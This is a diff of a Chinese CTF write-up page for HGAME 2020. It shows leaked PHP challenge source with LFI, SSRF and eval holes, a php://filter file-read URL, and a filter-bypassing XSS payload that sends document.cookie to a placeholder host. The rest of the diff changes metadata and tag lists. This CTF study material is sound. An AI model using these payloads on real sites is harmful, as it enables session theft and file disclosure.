@@ -27,7 +27,7 @@
 <meta property="og:image" content="https://blog.yd0ng.top/2020/02/13/HGAME-2020/10.png">
 <meta property="og:image" content="https://blog.yd0ng.top/2020/02/13/HGAME-2020/11.png">
 <meta property="article:published_time" content="2020-02-13T06:27:52.000Z">
-<meta property="article:modified_time" content="2020-02-14T07:09:25.000Z">
+<meta property="article:modified_time" content="2026-07-07T12:41:14.453Z">
 <meta property="article:author" content="yd0ng">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
@@ -74,7 +74,7 @@
 		</nav>
 		
 		<nav>
-			总文章数 160
+			总文章数 161
 		</nav>
 		<nav class="header-smart-menu">
     		
@@ -203,7 +203,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">if(isset($_SESSION[&#39;username&#39;])) &#123;</span><br><span class="line">    header(&quot;Location: admin.php&quot;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$action &#x3D; @$_GET[&#39;action&#39;];</span><br><span class="line">$filter &#x3D; &quot;&#x2F;config|etc|flag&#x2F;i&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;action&#39;]) &amp;&amp; !empty($_GET[&#39;action&#39;])) &#123;</span><br><span class="line">    if(preg_match($filter, $_GET[&#39;action&#39;])) &#123;</span><br><span class="line">        echo &quot;Hacker get out!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">        include $action;</span><br><span class="line">&#125;</span><br><span class="line">elseif(!isset($_GET[&#39;action&#39;]) || empty($_GET[&#39;action&#39;])) &#123;</span><br><span class="line">    header(&quot;Location: ?action&#x3D;login.php&quot;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><a href="http://cosmos-admin.hgame.day-day.work/index.php?action=php://filter/read=convert.base64-encode/resource=admin.php" target="_blank" rel="noopener">http://cosmos-admin.hgame.day-day.work/index.php?action=php://filter/read=convert.base64-encode/resource=admin.php</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line">if(!isset($_SESSION[&#39;username&#39;])) &#123;</span><br><span class="line">    header(&#39;Location: index.php&#39;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function insert_img() &#123;</span><br><span class="line">    if (isset($_POST[&#39;img_url&#39;])) &#123;</span><br><span class="line">        $img_url &#x3D; @$_POST[&#39;img_url&#39;];</span><br><span class="line">        $url_array &#x3D; parse_url($img_url);</span><br><span class="line">        if (@$url_array[&#39;host&#39;] !&#x3D;&#x3D; &quot;localhost&quot; &amp;&amp; $url_array[&#39;host&#39;] !&#x3D;&#x3D; &quot;timgsa.baidu.com&quot;) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;   </span><br><span class="line">        $c &#x3D; curl_init();</span><br><span class="line">        curl_setopt($c, CURLOPT_URL, $img_url);</span><br><span class="line">        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $res &#x3D; curl_exec($c);</span><br><span class="line">        curl_close($c);</span><br><span class="line">        $avatar &#x3D; base64_encode($res);</span><br><span class="line"></span><br><span class="line">        if(filter_var($img_url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            return $avatar;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        return base64_encode(file_get_contents(&quot;static&#x2F;logo.png&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Cosmos&#39;Blog - åå°ç®¡ç&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;a href&#x3D;&quot;logout.php&quot;&gt;éåºç»é&lt;&#x2F;a&gt;</span><br><span class="line">        &lt;div style&#x3D;&quot;text-align: center;&quot;&gt;</span><br><span class="line">            &lt;h1&gt;Welcome &lt;?php echo $_SESSION[&#39;username&#39;];?&gt; &lt;&#x2F;h1&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">            &lt;fieldset style&#x3D;&quot;width: 30%;height: 20%;float:left&quot;&gt;</span><br><span class="line">                &lt;legend&gt;æå¥å¾ç&lt;&#x2F;legend&gt;</span><br><span class="line">                &lt;p&gt;&lt;label&gt;å¾çurl: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;img_url&quot; placeholder&#x3D;&quot;&quot;&gt;&lt;&#x2F;label&gt;&lt;&#x2F;p&gt;</span><br><span class="line">                &lt;p&gt;&lt;button type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot;&gt;æå¥&lt;&#x2F;button&gt;&lt;&#x2F;p&gt;</span><br><span class="line">            &lt;&#x2F;fieldset&gt;</span><br><span class="line">        &lt;&#x2F;form&gt;</span><br><span class="line">        &lt;fieldset style&#x3D;&quot;width: 30%;height: 20%;float:left&quot;&gt;</span><br><span class="line">                &lt;legend&gt;è¯è®ºç®¡ç&lt;&#x2F;legend&gt;</span><br><span class="line">                &lt;h2&gt;å¾å¼å..&lt;&#x2F;h2&gt;</span><br><span class="line">        &lt;&#x2F;fieldset&gt;</span><br><span class="line">        &lt;fieldset style&#x3D;&quot;width: 30%;height: 20%;&quot;&gt;</span><br><span class="line">                &lt;legend&gt;æç« åè¡¨&lt;&#x2F;legend&gt;</span><br><span class="line">                &lt;h2&gt;å¾å¼å..&lt;&#x2F;h2&gt;</span><br><span class="line">        &lt;&#x2F;fieldset&gt;</span><br><span class="line">        &lt;fieldset style&#x3D;&quot;height: 50%&quot;&gt;</span><br><span class="line">            &lt;div style&#x3D;&quot;text-align: center;&quot;&gt;</span><br><span class="line">                &lt;img height&#x3D;&#39;200&#39; width&#x3D;&#39;500&#39; src&#x3D;&#39;data:image&#x2F;jpeg;base64,&lt;?php echo insert_img() ? insert_img() : base64_encode(file_get_contents(&quot;static&#x2F;error.jpg&quot;)); ?&gt;&#39;&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;fieldset&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line">if(!isset($_SESSION[&#39;username&#39;])) &#123;</span><br><span class="line">    header(&#39;Location: index.php&#39;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function insert_img() &#123;</span><br><span class="line">    if (isset($_POST[&#39;img_url&#39;])) &#123;</span><br><span class="line">        $img_url &#x3D; @$_POST[&#39;img_url&#39;];</span><br><span class="line">        $url_array &#x3D; parse_url($img_url);</span><br><span class="line">        if (@$url_array[&#39;host&#39;] !&#x3D;&#x3D; &quot;localhost&quot; &amp;&amp; $url_array[&#39;host&#39;] !&#x3D;&#x3D; &quot;timgsa.baidu.com&quot;) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;   </span><br><span class="line">        $c &#x3D; curl_init();</span><br><span class="line">        curl_setopt($c, CURLOPT_URL, $img_url);</span><br><span class="line">        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $res &#x3D; curl_exec($c);</span><br><span class="line">        curl_close($c);</span><br><span class="line">        $avatar &#x3D; base64_encode($res);</span><br><span class="line"></span><br><span class="line">        if(filter_var($img_url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            return $avatar;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        return base64_encode(file_get_contents(&quot;static&#x2F;logo.png&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Cosmos&#39;Blog - åå°ç®¡ç&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;a href&#x3D;&quot;logout.php&quot;&gt;éåºç»é&lt;&#x2F;a&gt;</span><br><span class="line">        &lt;div style&#x3D;&quot;text-align: center;&quot;&gt;</span><br><span class="line">            &lt;h1&gt;Welcome &lt;?php echo $_SESSION[&#39;username&#39;];?&gt; &lt;&#x2F;h1&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">            &lt;fieldset style&#x3D;&quot;width: 30%;height: 20%;float:left&quot;&gt;</span><br><span class="line">                &lt;legend&gt;æå</span><br><span class="line">¥å¾ç&lt;&#x2F;legend&gt;</span><br><span class="line">                &lt;p&gt;&lt;label&gt;å¾çurl: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;img_url&quot; placeholder&#x3D;&quot;&quot;&gt;&lt;&#x2F;label&gt;&lt;&#x2F;p&gt;</span><br><span class="line">                &lt;p&gt;&lt;button type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot;&gt;æå</span><br><span class="line">¥&lt;&#x2F;button&gt;&lt;&#x2F;p&gt;</span><br><span class="line">            &lt;&#x2F;fieldset&gt;</span><br><span class="line">        &lt;&#x2F;form&gt;</span><br><span class="line">        &lt;fieldset style&#x3D;&quot;width: 30%;height: 20%;float:left&quot;&gt;</span><br><span class="line">                &lt;legend&gt;è¯è®ºç®¡ç&lt;&#x2F;legend&gt;</span><br><span class="line">                &lt;h2&gt;å¾</span><br><span class="line">å¼å..&lt;&#x2F;h2&gt;</span><br><span class="line">        &lt;&#x2F;fieldset&gt;</span><br><span class="line">        &lt;fieldset style&#x3D;&quot;width: 30%;height: 20%;&quot;&gt;</span><br><span class="line">                &lt;legend&gt;æç« åè¡¨&lt;&#x2F;legend&gt;</span><br><span class="line">                &lt;h2&gt;å¾</span><br><span class="line">å¼å..&lt;&#x2F;h2&gt;</span><br><span class="line">        &lt;&#x2F;fieldset&gt;</span><br><span class="line">        &lt;fieldset style&#x3D;&quot;height: 50%&quot;&gt;</span><br><span class="line">            &lt;div style&#x3D;&quot;text-align: center;&quot;&gt;</span><br><span class="line">                &lt;img height&#x3D;&#39;200&#39; width&#x3D;&#39;500&#39; src&#x3D;&#39;data:image&#x2F;jpeg;base64,&lt;?php echo insert_img() ? insert_img() : base64_encode(file_get_contents(&quot;static&#x2F;error.jpg&quot;)); ?&gt;&#39;&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;fieldset&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
 
 <p><a href="http://cosmos-admin.hgame.day-day.work/index.php?action=php://filter/read=convert.base64-encode/resource=login.php" target="_blank" rel="noopener">http://cosmos-admin.hgame.day-day.work/index.php?action=php://filter/read=convert.base64-encode/resource=login.php</a></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Only for debug</span><br><span class="line">if (DEBUG_MODE)&#123;</span><br><span class="line">    if(isset($_GET[&#39;debug&#39;])) &#123;</span><br><span class="line">        $debug &#x3D; $_GET[&#39;debug&#39;];</span><br><span class="line">        if (!preg_match(&quot;&#x2F;^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$&#x2F;&quot;, $debug)) &#123;</span><br><span class="line">            die(&quot;args error!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&quot;var_dump($$debug);&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_SESSION[&#39;username&#39;])) &#123;</span><br><span class="line">    header(&quot;Location: admin.php&quot;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])) &#123;</span><br><span class="line">        if ($admin_password &#x3D;&#x3D; md5($_POST[&#39;password&#39;]) &amp;&amp; $_POST[&#39;username&#39;] &#x3D;&#x3D;&#x3D; $admin_username)&#123;</span><br><span class="line">            $_SESSION[&#39;username&#39;] &#x3D; $_POST[&#39;username&#39;];</span><br><span class="line">            header(&quot;Location: admin.php&quot;);</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            echo &quot;ç¨æ·åæå¯ç éè¯¯&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;author&quot; content&#x3D;&quot;&quot;&gt;</span><br><span class="line">    &lt;title&gt;Cosmosçåå®¢åå°&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;static&#x2F;signin.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;static&#x2F;sticky-footer.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;https:&#x2F;&#x2F;cdn.bootcss.com&#x2F;bootstrap&#x2F;3.3.7&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">    &lt;form class&#x3D;&quot;form-signin&quot; method&#x3D;&quot;post&quot; action&#x3D;&quot;login.php&quot;&gt;</span><br><span class="line">        &lt;h2 class&#x3D;&quot;form-signin-heading&quot;&gt;åå°ç»é&lt;&#x2F;h2&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;ç¨æ·å&quot; required autofocus&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;å¯ç &quot; required&gt;</span><br><span class="line">        &lt;input class&#x3D;&quot;btn btn-lg btn-primary btn-block&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;footer class&#x3D;&quot;footer&quot;&gt;</span><br><span class="line">	&lt;center&gt;</span><br><span class="line">	&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">        &lt;p class&#x3D;&quot;text-muted&quot;&gt;Created by Annevi&lt;&#x2F;p&gt;</span><br><span class="line">      &lt;&#x2F;div&gt;</span><br><span class="line">      &lt;&#x2F;center&gt;</span><br><span class="line">&lt;&#x2F;footer&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
@@ -288,6 +288,7 @@
 <h2 id="Cosmos的聊天室-1"><a href="#Cosmos的聊天室-1" class="headerlink" title="Cosmos的聊天室"></a>Cosmos的聊天室</h2><p>过滤了script，双写绕过即可，没复现成功，玄学操作</p>
 <p>给出理论上可以打的exp</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scriscriptpt src&#x3D;&quot;&#x2F;send?message&#x3D;window.open(&#39;http:&#x2F;&#x2F;ip:port&#x2F;?&#39;%2bdocument.cookie)&quot;&gt;&lt;&#x2F;scscriptript&gt;</span><br></pre></td></tr></table></figure>
+
       
       
     
@@ -636,43 +637,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">随手小记</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">安全会议</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">CTF</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">技术文档</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Web安全</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">静态代码分析</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">DAST</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">信息收集</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">研发工程</a>
+                <a href="javascript:void(0)" class="js-tag color3">AI</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -680,47 +649,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Java安全</a>
+                <a href="javascript:void(0)" class="js-tag color5">备考求职</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">JAVA开发</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">Reverse</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">前端开发</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">靶机渗透</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">读书笔记</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">好好生活</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">逆向工程</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">留学</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">前端安全</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">数据分析</a>
+                <a href="javascript:void(0)" class="js-tag color5">安全会议</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -728,19 +661,31 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">国央企备考</a>
+                <a href="javascript:void(0)" class="js-tag color5">技术文档</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">理财</a>
+                <a href="javascript:void(0)" class="js-tag color5">应用安全</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">SAST</a>
+                <a href="javascript:void(0)" class="js-tag color5">开发工程</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">AI</a>
+                <a href="javascript:void(0)" class="js-tag color5">投资理财</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">生活记录</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">读书笔记</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">逆向工程</a>
               </li>
             
             <div class="clearfix"></div>
